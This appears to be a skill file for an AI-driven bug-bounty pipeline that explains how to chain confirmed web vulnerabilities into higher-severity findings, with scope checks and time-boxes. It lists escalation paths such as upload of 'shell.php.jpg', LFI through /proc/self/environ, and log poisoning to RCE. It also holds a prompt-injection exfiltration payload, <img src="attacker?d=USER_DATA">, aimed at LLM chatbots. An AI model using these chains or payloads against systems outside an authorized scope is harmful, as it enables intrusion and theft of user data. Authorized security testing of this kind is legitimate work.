---
name: bbh-chain
description: Build A-to-B-to-C exploit chains from already-confirmed findings to raise severity and payout — the ABH /chain stage, run AFTER bbh-validate and BEFORE the 7-Question Gate. Carries the A-to-B signal table, the rules before pursuing B, and the hard time-box rules. Use on any CONFIRMED finding that is Low/Medium, on the conditionally-valid list, or that hints at a sibling endpoint.
whenToUse: After a finding reaches CONFIRMED, and before running the 7 questions on it. Specifically when a confirmed bug is low severity, is on the never-submit list alone, or the executor logged chain_hints.
---

# bbh-chain — Stage 7, A → B → C

**Input:** `CONFIRMED` findings at `<slice>/artifacts/validated/F-*.json` plus each source
finding's `chain_hints[]` from `contracts/finding.schema.json`.
**Output:** new candidate findings at `<slice>/findings/finding-<NNN>/` (`bbh/finding/v1`) for
each B and C, plus a chain section in `<slice>/attack-chain.md` and the linkage in
`<slice>/session-memory.md`.

> **No new schema.** A B or C is an ordinary candidate finding with its own `finding_id`, its own
> PoC and its own evidence. That is deliberate: it must go through `bbh-validate` independently,
> and it is **separately payable**. `contracts/seven-questions.schema.json` carries
> `q7.chain_used` precisely so the gate can see the chain without the chain being merged into one
> report.

> **Orchestrated path:** `workflows/bbh-hunt.js` runs this stage as part of the full pipeline
> and stops at the checkpoints. This skill is the manual path and the reference for what the
> stage does; both write the same artifacts. See `/bbh` § "Two ways to drive this".

## When to run this

After confirming a standalone finding that:

- is on the **conditionally valid** list (open redirect, SSRF DNS-only, clickjacking, CORS
  wildcard, host-header injection, self-XSS, prompt injection, S3 listing, GraphQL introspection…);
- validated but classified **Low** (or Medium that could be High);
- suggests a **sibling**: an id-keyed read implies the write; a `/v2/` fix implies `/v1/` is
  unfixed; one vulnerable controller implies its siblings.

Skip this stage for a confirmed standalone High/Critical with no sibling surface. Chaining is not
a ritual; it is a payout multiplier for findings that are individually weak.

## The A → B signal table

If you found A, immediately check these B candidates:

| Found A | Immediately check B | Also check C |
|---|---|---|
| IDOR on GET `/api/user/X/orders` | IDOR on PUT/DELETE same path | IDOR on ALL sibling endpoints |
| IDOR on `/v2/` endpoint | Same IDOR on `/v1/` (missing fix) | IDOR on mobile API |
| Auth bypass on one endpoint | Every sibling in same controller | Old API version |
| Stored XSS in user input | Does admin view this? (priv esc) | Email/export/PDF rendering |
| SSRF with DNS callback | SSRF reaching internal services | SSRF via open redirect |
| SQLi on one parameter | Every parameter in same endpoint | Same param type in sibling endpoints |
| File upload — PNG allowed | SVG (XSS), HTML, PHP/JSP (RCE) | Double extension `shell.php.jpg` |
| OAuth missing PKCE | CSRF on OAuth flow (state param?) | Token reuse: auth_code exchanged twice? |
| Open redirect confirmed | OAuth code theft via `redirect_uri` | Phishing chain |
| GraphQL introspection | Auth bypass on mutations | IDOR via `node(id)` |
| Race condition on coupons | Race on credits/wallet | Race on rate limits |
| Exposed S3 listing | JS bundles → grep API keys/OAuth | `.env` files in bucket |
| Missing rate limit on OTP | Brute force OTP directly | Brute force password reset tokens |
| CSRF on sensitive action | XSS→CSRF = Critical | `img src` / form autosubmit |
| Path traversal | LFI: `/proc/self/environ` or logs | Log poisoning → RCE |
| Leaked API key in JS | Call the API with that key — what can it do? | Other keys in the same file |
| LLM chatbot prompt injection | IDOR via chatbot (other user's data) | Exfil: `<img src="attacker?d=USER_DATA">` |

## Rules before pursuing B

1. **Confirm A is REAL first** — exact HTTP request + response, `CONFIRMED` by `bbh-validate`.
   Chaining an unconfirmed A multiplies a guess.
2. **B must be a DIFFERENT bug** — different endpoint, or different mechanism, or different impact.
3. **B must pass Gate 0 independently:** "can an attacker do this RIGHT NOW, causing real harm?"
4. **Never report A + B as one report unless they ARE one attack chain.** Two separate bugs are two
   separate reports and two separate payouts.
5. **Each confirmed bug = separate report.** B gets its own `finding_id`, its own validation
   verdict, and its own 7-question pass. Saying "similar to A in my other report" is not a
   substitute for Gate 0.

## Time-box rules (hard)

```
If B NOT confirmed in 20 minutes      → submit A, move on
If A + B + C confirmed                → STOP. Submit all three. Don't look for D.
If B needs a precondition you can't test → note it in A's report, move on
If 3 consecutive B candidates fail Gate 0 → cluster is dry, stop
```

## Rabbit-hole signals — stop immediately

- You have been on B for **30+ minutes with no PoC**.
- You are on your **4th "maybe" candidate**.
- B needs **3+ simultaneous preconditions**.
- You keep writing "this could lead to…" **without an HTTP request**.

Also stop if finding B requires touching an out-of-scope asset or a third-party service: run
`python3 tools/bbh_scope.py check --scope runs/<eng>/scope.json --url <B-url>`. Exit 1 or 2 ends
the chain — no exceptions, however promising B looked. And never claim a dangling-CNAME takeover:
`classification.takeover[]` is recorded for the queue, never claimed without written authorization.

## Procedure

1. Read the confirmed verdict and the source finding's `chain_hints[]`.
2. Pick **one** B from the signal table. Write it as a hypothesis in `attack-chain.md`.
3. Claim/queue a lead for it (`tools/lead_board.py touch`), then test it inside the same slice —
   one asset, one coordinator, no cross-slice reads.
4. If B reproduces: file it as a **new candidate finding** with `chain_hints` naming A:

   ```json
   { "schema": "bbh/finding/v1", "finding_id": "F-004",
     "class_id": "<must be in this slice's applicable_cells>",
     "title": "OAuth code theft via confirmed open redirect in /r?to= enables ATO",
     "chain_hints": ["A = F-001 (open redirect, CONFIRMED)"],
     "description": "Chain: F-001 (/r?to= open redirect) -> redirect_uri -> auth code leak -> token exchange",
     "status": "candidate" }
   ```

5. **Send B straight back to `bbh-validate`** — a chain link is exactly as suspect as a
   first-order claim, and the refuters should be told the chain explicitly so they can attack the
   join, not just the endpoints.
6. Only after B is `CONFIRMED` does it become a chain in `attack-chain.md`:

   ```markdown
   ## Chains
   - F-001 (open redirect, confirmed) -> F-004 (OAuth code theft, confirmed) => ATO, Critical
   - Candidate C: exchange the same auth code twice (untested, 20-min box)
   ```

7. Record in `session-memory.md` under `## Chains` which `finding_id`s are links, so a later batch
   does not re-test the join.

## Done when

- [ ] Every confirmed A that is Low/Medium has been through the signal table once, or is marked
      "no sibling surface" in `attack-chain.md`.
- [ ] Each B/C that reproduced is filed as its **own** candidate finding.
- [ ] Each B/C was independently validated — no chain inherits A's verdict.
- [ ] `attack-chain.md` has a `## Chains` section naming every confirmed link A→B(→C).
- [ ] The 20-minute / 3-candidate / 30-minute boxes were honoured; abandoned leads are recorded
      with the reason, not deleted.
- [ ] Any B outside scope was dropped at `bbh_scope.py check`, and the attempt is recorded.

## Reference (do not duplicate)

- Upstream chain stage incl. the six worked high-value chains (S3→bundle→secret→OAuth,
  open redirect→OAuth code theft→ATO, XSS→CSRF→admin action, SSRF DNS→internal→cloud metadata,
  subdomain takeover→`redirect_uri`, prompt injection→IDOR→exfil):
  `vendor/upstream-commands/abh/chain.md` (ABH command; not vendored).
- Finding contract: `contracts/finding.schema.json`.
